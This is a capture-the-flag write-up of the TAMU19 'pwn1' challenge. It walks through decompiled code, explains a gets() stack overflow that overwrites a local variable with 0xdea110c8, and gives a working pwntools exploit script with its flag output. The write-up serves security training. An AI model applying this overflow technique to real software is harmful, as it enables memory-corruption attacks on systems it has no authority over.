# pwn1 - nightmare

check file type:
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1$ file pwn1 
pwn1: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd7aa1accb16feac888c99841f504, not stripped
```

Check file security.
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1$ checksec --file=pwn1
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   77) Symbols	  No	0		2		pwn1

```
nothing special let reverse the file with ghidra
```c
undefined4 main(undefined param_1)

{
  int iVar1;
  char local_43 [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &param_1;
  setvbuf(stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere theother side he see."
      );
  puts("What... is your name?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(local_43,0x2b,stdin);
  iVar1 = strcmp(local_43,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(local_43);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

we can see that if we want to print the flag we need that loca_18 show be the value `-0x215eef38` so inorder to enter this condition we need to put 
1. Sir Lancelot of Camelot
2. To seek the Holy Grail.

and than do the overflow `gets(local_43);`

local_43 = 43 bytes and local_18  come right after so we need to add \xc8\x10\xa1\xde (little endien)

lets write a script:
```python
#!/usr/bin/env python
from pwn import process, packing

def exploit():
    name = b"Sir Lancelot of Camelot"
    quest = b"To seek the Holy Grail."
    buffer = b'A' * 43 + packing.p32(0xdea110c8)
    prs = process("/home/matan/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1/pwn1")

    prs.sendline(name)
    prs.sendline(quest)
    prs.sendline(buffer)
    prs.interactive()


if __name__ == '__main__':
    exploit()

```

Result:
```console
matan@matan:~/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1$python /home/matan/Documents/hde65/web_requests/nightmare/tamu_pwn1.py
[+] Starting local process '/home/matan/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1/pwn1': pid 45365
[*] Switching to interactive mode
[*] Process '/home/matan/Documents/hacking/nightmare/stackoverflow/Tamu19_pwn1/pwn1' stopped with exit code 0 (pid 45365)
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
What... is your quest?
What... is my secret?
Right. Off you go.
flag{g0ttem_b0yz}

```





